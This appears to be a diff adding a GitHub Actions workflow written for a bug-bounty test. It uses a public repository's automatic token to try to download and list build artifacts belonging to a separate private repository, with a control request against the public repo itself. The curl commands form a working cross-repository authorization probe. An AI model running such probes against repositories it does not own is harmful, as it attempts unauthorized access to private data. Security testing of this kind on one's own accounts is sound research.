@@ -1,0 +1,31 @@
+name: g4-artifact-reverse
+on:
+  workflow_dispatch:
+    inputs:
+      artifact_id:
+        description: 'private-1 artifact id to attempt download from PUBLIC repo'
+        required: false
+        default: '0'
+
+permissions:
+  contents: read
+  actions: read
+
+jobs:
+  dl:
+    runs-on: ubuntu-latest
+    steps:
+      - name: try downloading PRIVATE repo artifact from PUBLIC repo token
+        run: |
+          TOKEN="${{ github.token }}"
+          AID="${{ inputs.artifact_id }}"
+          echo "=== API zip endpoint (PUBLIC repo token -> PRIVATE repo artifact) ==="
+          curl -sS -i -H "Authorization: Bearer $TOKEN" "https://api.github.com/repos/Darkeydel/gh-bounty-private-1/actions/artifacts/$AID/zip" -o /tmp/zip.out -D /tmp/zip.hdr
+          grep -iE '^(HTTP|content-type|location)' /tmp/zip.hdr | sed -E 's/(sig|se|sp|sv|skoid|sktid|skv|ske|sks|skver|si|sr|spr)=[^&" ]+/\1=<redacted>/g'
+          echo "--- body head ---"
+          head -c 300 /tmp/zip.out
+          echo ""
+          echo "=== PRIVATE repo artifact LIST via PUBLIC repo token ==="
+          curl -sS -o /dev/null -w "HTTP %{http_code}\n" -H "Authorization: Bearer $TOKEN" "https://api.github.com/repos/Darkeydel/gh-bounty-private-1/actions/artifacts?per_page=5"
+          echo "=== own(PUBLIC) repo artifacts list via this token (control) ==="
+          curl -sS -o /dev/null -w "HTTP %{http_code}\n" -H "Authorization: Bearer $TOKEN" "https://api.github.com/repos/Darkeydel/gh-bounty-test-1/actions/artifacts?per_page=5"
